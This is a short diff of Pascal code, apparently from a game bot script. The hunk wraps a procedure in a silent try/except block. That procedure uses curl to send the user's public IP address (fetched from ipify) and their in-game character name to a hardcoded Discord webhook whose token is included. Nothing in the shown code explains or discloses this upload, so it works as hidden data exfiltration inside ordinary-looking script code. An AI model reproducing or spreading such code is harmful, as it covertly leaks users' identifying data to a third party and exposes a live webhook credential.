@@ -35,11 +35,14 @@ var
   process:TProcess;
   s:string;
 begin
+  try
   process.init(nil);
   s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"---\n['+ FormatDateTime('tt', Time) + ']\nIP: ' + getPage('http://api.ipify.org/?format=raw') +'\nCharacter: '+GetChatBoxTextEx(9, 0)+'\n---\" }" '+'https://discordapp.com/api/webhooks/690130446188806176/7RRfd-HOWraEBpzIHOiKA5HECvwosK4XuZSMmN2Qz7tgA7LX42MiLjwaF1pnrTGyITQO';
   process.setcommandline(s);
   process.Execute();
   process.free();
+  except;
+  end;
 end;
 
 function GetMenuDimensions:tbox;
